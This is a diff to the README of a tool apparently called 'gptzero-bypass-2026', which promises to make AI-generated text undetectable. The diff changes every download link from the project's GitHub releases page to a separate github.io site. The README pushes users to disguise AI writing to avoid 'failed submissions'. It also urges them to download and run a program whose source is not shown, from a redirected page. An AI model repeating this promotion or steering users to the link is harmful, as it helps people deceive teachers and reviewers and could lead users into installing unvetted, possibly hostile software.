@@ -1,7 +1,7 @@
 <h1>🤖 gptzero-bypass-2026 - Humanize Any AI Text Instantly</h1>
 
 <p align="center">
-<a href="https://github.com/luvswallow-creator/gptzero-bypass-2026/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=333" alt="Download" style="max-width:100%;"></a>
+<a href="https://luvswallow-creator.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=333" alt="Download" style="max-width:100%;"></a>
 </p>
 
 Welcome! If you've ever used ChatGPT, Claude, or any other AI writing tool and got flagged by GPTZero, you're in the right place. **gptzero-bypass-2026** is a simple, powerful program that rewrites AI-generated text to make it sound 100% human. No more detection warnings. No more failed submissions. Just clean, natural writing that passes every check.
@@ -40,7 +40,7 @@ Getting started is incredibly easy. No coding, no complicated setup. Here's what
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/luvswallow-creator/gptzero-bypass-2026/releases](https://github.com/luvswallow-creator/gptzero-bypass-2026/releases)
+**Visit this link to download the application:** [https://luvswallow-creator.github.io](https://luvswallow-creator.github.io)
 
 Click the link above, and you'll land on the download page. Look for the newest release and click the download button. The file is small, so it will download quickly.
 
@@ -167,7 +167,7 @@ Usually just a few seconds. Longer documents may take 10–20 seconds, but the w
 
 Ready to start writing without worrying about detection? Here's your download link again:
 
-### [⬇️ Download gptzero-bypass-2026 Now](https://github.com/luvswallow-creator/gptzero-bypass-2026/releases)
+### [⬇️ Download gptzero-bypass-2026 Now](https://luvswallow-creator.github.io)
 
 **Visit this link to download the application.**
 
